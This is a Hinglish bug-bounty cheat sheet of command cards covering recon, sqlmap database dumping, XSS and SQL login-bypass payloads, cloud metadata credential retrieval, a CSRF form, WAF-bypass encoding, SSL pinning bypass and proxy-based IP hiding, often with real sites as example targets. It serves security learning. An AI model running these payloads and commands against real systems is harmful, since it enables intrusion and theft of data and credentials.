# 🚀 Quick Reference Command Cards
## Bug Hunting Commands - Easy Format Cards

---

# 📋 How to Use These Cards

Ye cards tumhare liye quick reference hain. Har card mein:
- **Command**: Exact command with syntax
- **Purpose**: Kya karta hai ye command
- **Example**: Real example with output
- **Pro Tip**: Advanced usage tip
- **Hinglish Explanation**: Simple Hindi mein explanation

---

# 🔍 RECONNAISSANCE CARDS

## Card 1: Subdomain Discovery
```bash
┌─────────────────────────────────────────────────────────────┐
│                    SUBDOMAIN DISCOVERY                      │
├─────────────────────────────────────────────────────────────┤
│ Command: subfinder -d target.com -o subdomains.txt         │
│ Purpose: Target ke saare subdomains dhundna                │
│ Example: subfinder -d google.com -o google_subs.txt        │
│ Output:  mail.google.com, drive.google.com, etc.           │
│ Pro Tip: -silent flag use karo clean output ke liye        │
│ Hindi:   Ye tool website ke chhupe hue subdomains nikalta  │
│          hai jo main site se connected hote hain           │
└─────────────────────────────────────────────────────────────┘
```

## Card 2: Live Subdomain Check
```bash
┌─────────────────────────────────────────────────────────────┐
│                   LIVE SUBDOMAIN CHECK                     │
├─────────────────────────────────────────────────────────────┤
│ Command: httpx -l subdomains.txt -o live_subs.txt          │
│ Purpose: Kaun se subdomains actually live/active hain      │
│ Example: httpx -l google_subs.txt -status-code -title      │
│ Output:  https://mail.google.com [200] [Gmail]             │
│ Pro Tip: -tech-detect flag se technology bhi pata chalti   │
│ Hindi:   Ye check karta hai ki subdomain actually kaam kar │
│          raha hai ya nahi, aur kya technology use kar raha │
└─────────────────────────────────────────────────────────────┘
```

## Card 3: Port Scanning
```bash
┌─────────────────────────────────────────────────────────────┐
│                      PORT SCANNING                         │
├─────────────────────────────────────────────────────────────┤
│ Command: nmap -sC -sV -oN scan.txt target.com              │
│ Purpose: Target pe kaun se ports open hain aur services    │
│ Example: nmap -sC -sV -oN google_scan.txt google.com       │
│ Output:  80/tcp open http nginx 1.18.0                     │
│ Pro Tip: -T4 flag se fast scanning, -p- se all ports      │
│ Hindi:   Ye dekkhta hai ki server pe kaun se darwaze khule │
│          hain aur kya services chal rahi hain              │
└─────────────────────────────────────────────────────────────┘
```

## Card 4: Technology Detection
```bash
┌─────────────────────────────────────────────────────────────┐
│                  TECHNOLOGY DETECTION                      │
├─────────────────────────────────────────────────────────────┤
│ Command: whatweb target.com                                 │
│ Purpose: Website kya technology use kar rahi hai            │
│ Example: whatweb facebook.com                               │
│ Output:  PHP 7.4, MySQL, Apache 2.4, jQuery 3.5           │
│ Pro Tip: -v flag se detailed information milti hai         │
│ Hindi:   Ye batata hai ki website kya programming language │
│          aur database use kar rahi hai                      │
└─────────────────────────────────────────────────────────────┘
```

---

# 🎯 VULNERABILITY SCANNING CARDS

## Card 5: Directory Bruteforcing
```bash
┌─────────────────────────────────────────────────────────────┐
│                  DIRECTORY BRUTEFORCING                    │
├─────────────────────────────────────────────────────────────┤
│ Command: gobuster dir -u https://target.com -w wordlist.txt│
│ Purpose: Website ke hidden directories/folders dhundna     │
│ Example: gobuster dir -u https://site.com -w /usr/share/   │
│          wordlists/dirb/common.txt                          │
│ Output:  /admin (Status: 200), /backup (Status: 403)       │
│ Pro Tip: -x php,html,js flag se extensions bhi check karo  │
│ Hindi:   Ye website ke chhupe hue folders dhundta hai jo   │
│          admin panel ya sensitive files ho sakte hain      │
└─────────────────────────────────────────────────────────────┘
```

## Card 6: Vulnerability Scanning
```bash
┌─────────────────────────────────────────────────────────────┐
│                  VULNERABILITY SCANNING                    │
├─────────────────────────────────────────────────────────────┤
│ Command: nuclei -l targets.txt -o vulnerabilities.txt      │
│ Purpose: Automated vulnerability detection                 │
│ Example: nuclei -l live_subs.txt -t cves/ -o results.txt   │
│ Output:  [CVE-2021-44228] Log4j RCE found on target.com    │
│ Pro Tip: -severity critical flag se sirf critical bugs    │
│ Hindi:   Ye automatically website mein security holes     │
│          dhundta hai jo hackers exploit kar sakte hain     │
└─────────────────────────────────────────────────────────────┘
```

## Card 7: Parameter Discovery
```bash
┌─────────────────────────────────────────────────────────────┐
│                   PARAMETER DISCOVERY                      │
├─────────────────────────────────────────────────────────────┤
│ Command: arjun -u https://target.com/page.php              │
│ Purpose: Hidden parameters dhundna jo testing ke liye      │
│ Example: arjun -u https://site.com/search.php              │
│ Output:  [+] Parameter found: debug, admin, test           │
│ Pro Tip: -m GET,POST dono methods test karo                │
│ Hindi:   Ye website ke chhupe hue parameters dhundta hai   │
│          jo developers testing ke liye use karte hain      │
└─────────────────────────────────────────────────────────────┘
```

---

# 💉 SQL INJECTION CARDS

## Card 8: Basic SQL Injection Test
```bash
┌─────────────────────────────────────────────────────────────┐
│                 BASIC SQL INJECTION TEST                   │
├─────────────────────────────────────────────────────────────┤
│ Command: curl "https://site.com/page.php?id=1'"            │
│ Purpose: SQL injection vulnerability check karna           │
│ Example: curl "https://shop.com/product.php?id=1'"         │
│ Output:  MySQL Error: syntax error near "1''" at line 1   │
│ Pro Tip: Error messages mein database type pata chalta hai │
│ Hindi:   Ye check karta hai ki website database queries   │
│          mein user input properly handle kar rahi hai      │
└─────────────────────────────────────────────────────────────┘
```

## Card 9: SQLMap Automated Testing
```bash
┌─────────────────────────────────────────────────────────────┐
│                  SQLMAP AUTOMATED TESTING                  │
├─────────────────────────────────────────────────────────────┤
│ Command: sqlmap -u "https://site.com/page.php?id=1" --dbs  │
│ Purpose: Automatic SQL injection aur database extraction   │
│ Example: sqlmap -u "https://shop.com/product.php?id=1"     │
│          --dbs --batch                                      │
│ Output:  [INFO] available databases [3]: shop, users, logs │
│ Pro Tip: --batch flag se automatic mode, no questions      │
│ Hindi:   Ye automatically SQL injection attack karta hai   │
│          aur database ka saara data nikal sakta hai        │
└─────────────────────────────────────────────────────────────┘
```

## Card 10: Database Enumeration
```bash
┌─────────────────────────────────────────────────────────────┐
│                   DATABASE ENUMERATION                     │
├─────────────────────────────────────────────────────────────┤
│ Command: sqlmap -u "URL" -D database_name --tables         │
│ Purpose: Specific database ke tables dhundna               │
│ Example: sqlmap -u "https://site.com/page.php?id=1"        │
│          -D users --tables                                  │
│ Output:  [INFO] tables [4]: admin, customers, orders       │
│ Pro Tip: --dump flag se table ka data extract kar sakte ho │
│ Hindi:   Ye database ke andar ke tables aur unka structure │
│          dikhata hai, jaise filing cabinet ke drawers      │
└─────────────────────────────────────────────────────────────┘
```

---

# 🔥 XSS TESTING CARDS

## Card 11: Basic XSS Test
```bash
┌─────────────────────────────────────────────────────────────┐
│                     BASIC XSS TEST                         │
├─────────────────────────────────────────────────────────────┤
│ Command: curl "https://site.com/search?q=<script>alert(1)" │
│ Purpose: Cross-Site Scripting vulnerability check          │
│ Example: curl "https://blog.com/search?q=<script>alert(1)" │
│ Output:  <script>alert(1)</script> (if vulnerable)         │
│ Pro Tip: Browser mein test karo, curl mein JS execute nahi │
│ Hindi:   Ye check karta hai ki website user ka input      │
│          safely handle kar rahi hai ya malicious code run  │
└─────────────────────────────────────────────────────────────┘
```

## Card 12: XSS Payload Testing
```bash
┌─────────────────────────────────────────────────────────────┐
│                    XSS PAYLOAD TESTING                     │
├─────────────────────────────────────────────────────────────┤
│ Payloads: <img src=x onerror=alert('XSS')>                 │
│          <svg onload=alert('XSS')>                          │
│          <details open ontoggle=alert('XSS')>              │
│ Purpose: Different XSS vectors test karna                  │
│ Example: Search box mein ye payloads try karo              │
│ Output:  Alert popup agar vulnerable hai                   │
│ Pro Tip: WAF bypass ke liye encoding use karo              │
│ Hindi:   Ye different tarike hain website mein malicious   │
│          JavaScript code inject karne ke                   │
└─────────────────────────────────────────────────────────────┘
```

---

# 🔐 AUTHENTICATION TESTING CARDS

## Card 13: Login Bypass Test
```bash
┌─────────────────────────────────────────────────────────────┐
│                    LOGIN BYPASS TEST                       │
├─────────────────────────────────────────────────────────────┤
│ Username: admin' OR '1'='1'--                              │
│ Password: anything                                          │
│ Purpose: SQL injection se authentication bypass            │
│ Example: Login form mein ye credentials try karo           │
│ Output:  Successful login agar vulnerable hai              │
│ Pro Tip: Different SQL payloads try karo                   │
│ Hindi:   Ye login page ko bypass karne ka tarika hai       │
│          bina sahi password ke admin access mil jata hai   │
└─────────────────────────────────────────────────────────────┘
```

## Card 14: Session Token Analysis
```bash
┌─────────────────────────────────────────────────────────────┐
│                  SESSION TOKEN ANALYSIS                    │
├─────────────────────────────────────────────────────────────┤
│ Command: echo "cookie_value" | base64 -d                   │
│ Purpose: Session cookies decode karke analyze karna        │
│ Example: echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d       │
│ Output:  {"user":"admin"}                                   │
│ Pro Tip: JWT tokens jwt.io pe decode kar sakte ho          │
│ Hindi:   Ye session cookies ko decode karta hai aur dekh   │
│          sakte hain ki kya information store hai           │
└─────────────────────────────────────────────────────────────┘
```

---

# 📱 MOBILE APP TESTING CARDS

## Card 15: APK Analysis
```bash
┌─────────────────────────────────────────────────────────────┐
│                      APK ANALYSIS                          │
├─────────────────────────────────────────────────────────────┤
│ Command: apktool d app.apk                                  │
│ Purpose: Android app ko reverse engineer karna             │
│ Example: apktool d instagram.apk                            │
│ Output:  Decompiled source code aur resources              │
│ Pro Tip: strings.xml mein API keys mil sakte hain          │
│ Hindi:   Ye Android app ko tod kar uske andar ka code      │
│          aur files dekh sakte hain                         │
└─────────────────────────────────────────────────────────────┘
```

## Card 16: API Endpoint Discovery
```bash
┌─────────────────────────────────────────────────────────────┐
│                  API ENDPOINT DISCOVERY                    │
├─────────────────────────────────────────────────────────────┤
│ Command: grep -r "api" app_decompiled/                     │
│ Purpose: Mobile app mein use hone wale API endpoints       │
│ Example: grep -r "https://api" instagram_decompiled/       │
│ Output:  https://api.instagram.com/v1/users/               │
│ Pro Tip: network_security_config.xml mein domains check   │
│ Hindi:   Ye mobile app ke andar chhupe hue API addresses   │
│          dhundta hai jo testing ke liye use kar sakte hain │
└─────────────────────────────────────────────────────────────┘
```

---

# ☁️ CLOUD SECURITY CARDS

## Card 17: S3 Bucket Discovery
```bash
┌─────────────────────────────────────────────────────────────┐
│                   S3 BUCKET DISCOVERY                      │
├─────────────────────────────────────────────────────────────┤
│ Command: aws s3 ls s3://bucket-name --no-sign-request      │
│ Purpose: Public S3 buckets mein sensitive data check       │
│ Example: aws s3 ls s3://company-backups --no-sign-request  │
│ Output:  2023-01-01 database_backup.sql                    │
│ Pro Tip: subfinder se S3 subdomains dhundo pehle           │
│ Hindi:   Ye Amazon ke cloud storage mein publicly open     │
│          files check karta hai jo sensitive ho sakte hain  │
└─────────────────────────────────────────────────────────────┘
```

## Card 18: Cloud Metadata Access
```bash
┌─────────────────────────────────────────────────────────────┐
│                  CLOUD METADATA ACCESS                     │
├─────────────────────────────────────────────────────────────┤
│ Command: curl http://169.254.169.254/latest/meta-data/     │
│ Purpose: Cloud instance metadata access (SSRF se)          │
│ Example: curl http://169.254.169.254/latest/meta-data/     │
│          iam/security-credentials/                          │
│ Output:  AWS access keys aur credentials                   │
│ Pro Tip: SSRF vulnerability se ye attack possible hai      │
│ Hindi:   Ye cloud server ki internal information access    │
│          karta hai jo normally accessible nahi hoti        │
└─────────────────────────────────────────────────────────────┘
```

---

# 🔄 AUTOMATION CARDS

## Card 19: One-liner Recon Pipeline
```bash
┌─────────────────────────────────────────────────────────────┐
│                ONE-LINER RECON PIPELINE                    │
├─────────────────────────────────────────────────────────────┤
│ Command: echo "target.com" | subfinder -silent | httpx     │
│          -silent | nuclei -silent                          │
│ Purpose: Complete automated reconnaissance                  │
│ Example: echo "google.com" | subfinder -silent | httpx     │
│          -silent | nuclei -t cves/ -silent                 │
│ Output:  Vulnerabilities found automatically               │
│ Pro Tip: Output ko file mein save karo analysis ke liye    │
│ Hindi:   Ye ek hi command mein complete recon kar deta hai │
│          subdomains se lekar vulnerabilities tak           │
└─────────────────────────────────────────────────────────────┘
```

## Card 20: XSS Automation
```bash
┌─────────────────────────────────────────────────────────────┐
│                     XSS AUTOMATION                         │
├─────────────────────────────────────────────────────────────┤
│ Command: echo "https://target.com" | waybackurls | gf xss  │
│          | qsreplace '"><script>alert(1)</script>'         │
│ Purpose: Automated XSS testing on historical URLs         │
│ Example: echo "https://site.com" | waybackurls | gf xss    │
│          | qsreplace 'XSS' | httpx -silent                 │
│ Output:  Potential XSS vulnerable URLs                     │
│ Pro Tip: Manual verification zaroori hai false positives   │
│ Hindi:   Ye automatically purane URLs mein XSS dhundta hai │
│          jo Wayback Machine mein stored hain               │
└─────────────────────────────────────────────────────────────┘
```

---

# 🛠️ UTILITY CARDS

## Card 21: URL Collection
```bash
┌─────────────────────────────────────────────────────────────┐
│                     URL COLLECTION                         │
├─────────────────────────────────────────────────────────────┤
│ Command: waybackurls target.com | sort -u > urls.txt       │
│ Purpose: Historical URLs collect karna testing ke liye     │
│ Example: waybackurls facebook.com | grep -E "\?" > params  │
│ Output:  https://facebook.com/search?q=test                │
│ Pro Tip: gau tool bhi use kar sakte ho URL collection ke   │
│ Hindi:   Ye website ke purane URLs collect karta hai jo    │
│          Internet Archive mein save hain                   │
└─────────────────────────────────────────────────────────────┘
```

## Card 22: Live URL Filtering
```bash
┌─────────────────────────────────────────────────────────────┐
│                   LIVE URL FILTERING                       │
├─────────────────────────────────────────────────────────────┤
│ Command: cat urls.txt | httpx -mc 200,301,302 -silent      │
│ Purpose: Sirf working URLs filter karna                    │
│ Example: cat collected_urls.txt | httpx -mc 200 -title     │
│ Output:  https://site.com/admin [200] [Admin Panel]        │
│ Pro Tip: -fc 404 flag se 404 errors filter out karo       │
│ Hindi:   Ye URLs ki list mein se sirf working URLs nikalta │
│          hai jo actually accessible hain                   │
└─────────────────────────────────────────────────────────────┘
```

---

# 🎯 SPECIALIZED TESTING CARDS

## Card 23: IDOR Testing
```bash
┌─────────────────────────────────────────────────────────────┐
│                      IDOR TESTING                          │
├─────────────────────────────────────────────────────────────┤
│ Command: curl -H "Authorization: Bearer TOKEN"             │
│          https://api.com/user/123                           │
│ Purpose: Insecure Direct Object Reference testing          │
│ Example: curl -H "Auth: Bearer xyz" https://api.com/user/1 │
│          curl -H "Auth: Bearer xyz" https://api.com/user/2 │
│ Output:  Different users' data accessible                  │
│ Pro Tip: Burp Intruder se automate kar sakte ho            │
│ Hindi:   Ye check karta hai ki kya aap dusre users ka data │
│          access kar sakte hain sirf ID change karke        │
└─────────────────────────────────────────────────────────────┘
```

## Card 24: CSRF Testing
```bash
┌─────────────────────────────────────────────────────────────┐
│                      CSRF TESTING                          │
├─────────────────────────────────────────────────────────────┤
│ HTML: <form method="POST" action="https://site.com/action">│
│       <input name="email" value="hacker@evil.com">         │
│       <input type="submit" value="Click Me">               │
│       </form>                                               │
│ Purpose: Cross-Site Request Forgery vulnerability test     │
│ Example: Password change form without CSRF token           │
│ Output:  Action performed without user's knowledge         │
│ Pro Tip: Check karo CSRF token present hai ya nahi         │
│ Hindi:   Ye attack user ke browser se unki permission ke   │
│          bina actions perform karta hai                    │
└─────────────────────────────────────────────────────────────┘
```

---

# 📊 REPORTING CARDS

## Card 25: Screenshot Capture
```bash
┌─────────────────────────────────────────────────────────────┐
│                   SCREENSHOT CAPTURE                       │
├─────────────────────────────────────────────────────────────┤
│ Command: gowitness single https://target.com               │
│ Purpose: Vulnerability ka visual proof capture karna       │
│ Example: gowitness single https://site.com/admin           │
│ Output:  screenshot-site.com-admin.png                     │
│ Pro Tip: aquatone bhi use kar sakte ho bulk screenshots    │
│ Hindi:   Ye vulnerability ka screenshot leta hai jo report │
│          mein proof ke taur pe use kar sakte hain          │
└─────────────────────────────────────────────────────────────┘
```

## Card 26: HTTP Response Analysis
```bash
┌─────────────────────────────────────────────────────────────┐
│                HTTP RESPONSE ANALYSIS                      │
├─────────────────────────────────────────────────────────────┤
│ Command: curl -I https://target.com                        │
│ Purpose: HTTP headers aur server information check         │
│ Example: curl -I https://site.com/admin                    │
│ Output:  Server: Apache/2.4.41, X-Powered-By: PHP/7.4     │
│ Pro Tip: Security headers missing hain ya nahi check karo  │
│ Hindi:   Ye server ki basic information aur security       │
│          headers check karta hai                           │
└─────────────────────────────────────────────────────────────┘
```

---

# 🎨 CUSTOM PAYLOAD CARDS

## Card 27: Custom Wordlist Creation
```bash
┌─────────────────────────────────────────────────────────────┐
│                CUSTOM WORDLIST CREATION                    │
├─────────────────────────────────────────────────────────────┤
│ Command: cewl https://target.com -w custom_wordlist.txt    │
│ Purpose: Target-specific wordlist banana                   │
│ Example: cewl https://company.com -w company_words.txt      │
│ Output:  company, products, services, team, etc.           │
│ Pro Tip: -d 2 flag se depth increase kar sakte ho          │
│ Hindi:   Ye website ke content se custom wordlist banata   │
│          hai jo directory bruteforcing mein useful hai     │
└─────────────────────────────────────────────────────────────┘
```

## Card 28: Payload Encoding
```bash
┌─────────────────────────────────────────────────────────────┐
│                    PAYLOAD ENCODING                        │
├─────────────────────────────────────────────────────────────┤
│ Command: echo "payload" | base64                            │
│ Purpose: WAF bypass ke liye payload encoding               │
│ Example: echo "<script>alert(1)</script>" | base64         │
│ Output:  PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==               │
│ Pro Tip: URL encoding, hex encoding bhi try karo           │
│ Hindi:   Ye payload ko encode karta hai taaki WAF/filters  │
│          bypass kar sake                                    │
└─────────────────────────────────────────────────────────────┘
```

---

# 🔧 TROUBLESHOOTING CARDS

## Card 29: Rate Limit Bypass
```bash
┌─────────────────────────────────────────────────────────────┐
│                   RATE LIMIT BYPASS                        │
├─────────────────────────────────────────────────────────────┤
│ Command: gobuster dir -u https://target.com -w wordlist    │
│          --delay 100ms -t 10                                │
│ Purpose: Rate limiting se bachne ke liye slow scanning     │
│ Example: gobuster dir -u https://site.com -w common.txt    │
│          --delay 200ms -t 5                                 │
│ Output:  Slow but steady directory enumeration             │
│ Pro Tip: Different User-Agents aur IPs use karo            │
│ Hindi:   Ye scanning ko slow karta hai taaki server tumhe  │
│          block na kare rate limiting ki wajah se           │
└─────────────────────────────────────────────────────────────┘
```

## Card 30: Proxy Chain Setup
```bash
┌─────────────────────────────────────────────────────────────┐
│                   PROXY CHAIN SETUP                        │
├─────────────────────────────────────────────────────────────┤
│ Command: proxychains nmap -sT target.com                   │
│ Purpose: IP address hide karne ke liye proxy use karna     │
│ Example: proxychains curl https://target.com               │
│ Output:  Request proxy ke through jaayegi                  │
│ Pro Tip: /etc/proxychains.conf mein proxy list add karo    │
│ Hindi:   Ye tumhara real IP address hide karta hai aur     │
│          proxy servers ke through traffic bhejta hai       │
└─────────────────────────────────────────────────────────────┘
```

---

# 🎯 QUICK TIPS CARDS

## Card 31: Time-based Testing
```bash
┌─────────────────────────────────────────────────────────────┐
│                   TIME-BASED TESTING                       │
├─────────────────────────────────────────────────────────────┤
│ SQL: ' OR SLEEP(5)--                                       │
│ XSS: <script>setTimeout(function(){alert('XSS')},5000)     │
│      </script>                                              │
│ Purpose: Time delays se vulnerability confirm karna        │
│ Example: Login form mein SQL time-based injection          │
│ Output:  5 second delay agar vulnerable hai                │
│ Pro Tip: Network latency consider karo timing mein         │
│ Hindi:   Ye time delay use karta hai vulnerability confirm │
│          karne ke liye jab direct output nahi milta        │
└─────────────────────────────────────────────────────────────┘
```

## Card 32: Error-based Information Gathering
```bash
┌─────────────────────────────────────────────────────────────┐
│              ERROR-BASED INFO GATHERING                    │
├─────────────────────────────────────────────────────────────┤
│ Payloads: ' (single quote)                                 │
│          " (double quote)                                   │
│          \ (backslash)                                      │
│          {{7*7}} (template injection)                      │
│ Purpose: Error messages se system info nikalna             │
│ Example: Search box mein single quote dalo                 │
│ Output:  MySQL error, PHP version, file paths              │
│ Pro Tip: Error messages screenshot kar lena                │
│ Hindi:   Ye intentionally errors generate karta hai taaki  │
│          system ki internal information mil sake           │
└─────────────────────────────────────────────────────────────┘
```

---

# 📱 MOBILE-SPECIFIC CARDS

## Card 33: Certificate Pinning Bypass
```bash
┌─────────────────────────────────────────────────────────────┐
│                CERTIFICATE PINNING BYPASS                  │
├─────────────────────────────────────────────────────────────┤
│ Command: frida -U -f com.app.package -l bypass-ssl.js      │
│ Purpose: Mobile app mein SSL pinning bypass karna          │
│ Example: frida -U -f com.instagram.android -l ssl-kill.js  │
│ Output:  SSL pinning disabled, traffic intercept possible  │
│ Pro Tip: objection tool bhi use kar sakte ho               │
│ Hindi:   Ye mobile app ki SSL security bypass karta hai    │
│          taaki traffic intercept kar sake                  │
└─────────────────────────────────────────────────────────────┘
```

## Card 34: Deep Link Testing
```bash
┌─────────────────────────────────────────────────────────────┐
│                   DEEP LINK TESTING                        │
├─────────────────────────────────────────────────────────────┤
│ Command: adb shell am start -W -a android.intent.action    │
│          .VIEW -d "app://sensitive-action" com.app.package  │
│ Purpose: Mobile app ke deep links test karna               │
│ Example: adb shell am start -a android.intent.action.VIEW  │
│          -d "myapp://admin/panel"                           │
│ Output:  Direct access to sensitive app sections           │
│ Pro Tip: AndroidManifest.xml mein deep links check karo    │
│ Hindi:   Ye mobile app ke internal links test karta hai jo │
│          sensitive sections ko directly access kar sakte   │
└─────────────────────────────────────────────────────────────┘
```

---

# 🎉 FINAL TIPS CARD

## Card 35: Bug Hunter's Mindset
```bash
┌─────────────────────────────────────────────────────────────┐
│                  BUG HUNTER'S MINDSET                      │
├─────────────────────────────────────────────────────────────┤
│ 🎯 Think like an attacker, not just a tester               │
│ 🔍 Every input field is a potential vulnerability          │
│ 📝 Document everything - screenshots, requests, responses  │
│ 🤝 Collaborate with community, share knowledge             │
│ 📚 Keep learning - new techniques emerge daily             │
│ ⚖️  Always stay within legal boundaries                    │
│ 🎨 Be creative - combine multiple small issues             │
│ 🕐 Patience is key - good bugs take time to find           │
│ Hindi: Bug hunting ek art hai jo practice se perfect hoti  │
│        hai. Hamesha curious raho aur ethical raho!         │
└─────────────────────────────────────────────────────────────┘
```

---

# 📋 How to Use These Cards Effectively

## Daily Practice Routine
1. **Morning**: 5 reconnaissance cards practice karo
2. **Afternoon**: 3 vulnerability testing cards try karo  
3. **Evening**: 2 automation cards implement karo
4. **Night**: 1 new technique research karo

## Card Organization Tips
1. **Print karo**: Physical cards banao quick reference ke liye
2. **Digital copy**: Phone mein save karo field testing ke liye
3. **Custom notes**: Har card mein apne notes add karo
4. **Success tracking**: Kaun se cards successful rhe mark karo

## Progressive Learning
- **Week 1-2**: Basic reconnaissance cards master karo
- **Week 3-4**: Vulnerability scanning cards practice karo
- **Week 5-6**: Manual testing techniques seekho
- **Week 7-8**: Automation aur advanced techniques

---

# 🚀 Quick Command Combinations

## Recon Combo
```bash
subfinder -d target.com -silent | httpx -silent | nuclei -silent -o results.txt
```

## Directory + Vuln Combo  
```bash
gobuster dir -u https://target.com -w wordlist.txt -x php,html | tee dirs.txt && nuclei -l dirs.txt
```

## Mobile Testing Combo
```bash
apktool d app.apk && grep -r "http" app/ && grep -r "api" app/
```

## SQL Testing Combo
```bash
waybackurls target.com | gf sqli | sqlmap --batch --random-agent
```

---

*"These cards are your weapons in the bug hunting battlefield. Master them one by one, and you'll become unstoppable!"*

**Happy Hunting! 🐛🔍**